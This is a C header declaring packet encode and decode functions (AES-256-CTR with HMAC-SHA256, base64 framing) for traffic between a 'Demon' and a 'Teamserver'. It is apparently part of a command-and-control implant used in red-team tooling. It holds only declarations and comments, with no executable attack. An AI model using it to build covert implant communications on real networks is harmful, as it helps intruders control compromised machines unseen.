#ifndef DEMON_WIRE_ENCODER_H
#define DEMON_WIRE_ENCODER_H

#include <windows.h>
#include <crypt/AesCrypt.h>
#include <crypt/HmacSha256.h>

/*!
 * @brief
 *  Encode a packet for transmission (Demon → Teamserver).
 *
 *  Produces: base64( [MaskedHeader | IV(16) | AES-CTR(Plaintext) | HMAC-SHA256(32)] )
 *
 *  The caller is responsible for deriving MacKey (HMAC-SHA256 of AES key over "mac")
 *  and wiping it after this call returns.
 *
 * @param Header       XOR-masked header bytes (Padding bytes, typically 20)
 * @param HeaderLen    Length of Header in bytes
 * @param Plaintext    Post-compression plaintext payload bytes
 * @param PlaintextLen Length of Plaintext in bytes
 * @param AesKey       32-byte AES-256 session key
 * @param MacKey       32-byte MAC key (derived by caller: HMAC-SHA256(AesKey, "mac"))
 * @param OutBuf       Receives pointer to base64-encoded output (caller must wipe + free)
 * @param OutLen       Receives length of *OutBuf in bytes
 * @return             TRUE on success, FALSE on allocation failure
 */
BOOL WireEncode(
    PBYTE   Header,
    UINT32  HeaderLen,
    PBYTE   Plaintext,
    SIZE_T  PlaintextLen,
    PBYTE   AesKey,
    PBYTE   MacKey,
    PBYTE*  OutBuf,
    PSIZE_T OutLen
);

/*!
 * @brief
 *  Decode a packet received from the teamserver (Teamserver → Demon).
 *
 *  Expects: base64( [IV(16) | AES-CTR(payload) | HMAC-SHA256(32)] )
 *
 *  Verifies HMAC before decryption (constant-time compare).
 *  The caller is responsible for deriving MacKey and wiping it after this call.
 *
 * @param Encoded      Raw (possibly base64) encoded response bytes
 * @param EncodedLen   Length of Encoded
 * @param AesKey       32-byte AES-256 session key
 * @param MacKey       32-byte MAC key (derived by caller: HMAC-SHA256(AesKey, "mac"))
 * @param PlaintextOut Receives pointer to decrypted plaintext (caller must wipe + free)
 * @param PlaintextLen Receives length of *PlaintextOut in bytes
 * @return             TRUE on success, FALSE on decode/auth/allocation failure
 */
BOOL WireDecode(
    PBYTE   Encoded,
    SIZE_T  EncodedLen,
    PBYTE   AesKey,
    PBYTE   MacKey,
    PBYTE*  PlaintextOut,
    PSIZE_T PlaintextLen
);

#endif /* DEMON_WIRE_ENCODER_H */
